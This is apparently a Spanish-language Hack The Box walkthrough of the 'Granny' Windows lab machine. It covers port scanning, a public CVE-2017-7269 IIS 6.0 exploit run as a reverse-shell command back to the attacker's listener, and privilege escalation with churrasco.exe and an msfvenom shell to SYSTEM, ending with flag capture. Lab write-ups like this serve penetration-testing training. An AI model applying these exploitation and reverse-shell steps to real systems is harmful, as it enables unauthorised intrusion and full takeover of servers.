![cover](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/granny.jpg)

## Windows - Easy
IP = 10.10.10.15

### USER ###

*** 
Ejecutamos nmap 
    
    nmap -p- --open --min-rate 5000 -n -Pn -oG allPorts 10.10.10.15
    
![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/allports.jpg)

    nmap -sC -sV -p80 -oN targeted 10.10.10.15

![Image text](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/targeted.jpg)

Detectamos un puerto IIS 6.0 habilitado 

Buscamos vulnerabilidades de IIS 6.0 y encontramos el CVE-2017-7269

Nos descargamos el exploit de:

https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269

Ejecutamos el exploit poniendo el puerto a la escucha.

    python2.7 iis6\ reverse\ shell 10.10.10.15 80 10.10.14.2 4444

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/acceso.jpg)   

Conseguimos acceso a la maquina, comprobamos el usuario con el que hemos accedido nt autority\network service

Esta cuenta tiene permisos de acceso a los recursos de red pero no podemos hacer nada con ella.

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/networkservice.jpg)

Buscamos informacion para la escalada de privilegios y encontramos el articulo
https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

ejecutamos 

    whoami /priv
    
![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/impersonate.jpg)

comprobamos que el SeImpresontaPrivilege Enabled
Descargamos churrasco.exe y lo compartimos con impacket

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/churrasco.jpg)

Ejecutamos whoami con churrasco.exe y vemos que somos system

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/system.jpg)

Creamos un reverse shell con msfvenom

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/shell.jpg)

lo copiamos en granny

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/copy2.jpg)

ponemos en escucha el puerto de nuestro reverse shell y ejecutamos lo ejecutamos con churrasco

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/exploit.jpg)

Conseguimos acceso con system

leemos la flag de user

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/user.jpg)

### Root ###
***

Ejeutamos cd en la caperta de administrador y vemos que nos permite el acceso, vamos al escritorio y encontramos la flag

![](https://github.com/b14nc0/CTF/blob/main/HTB/images/granny/root.jpg)
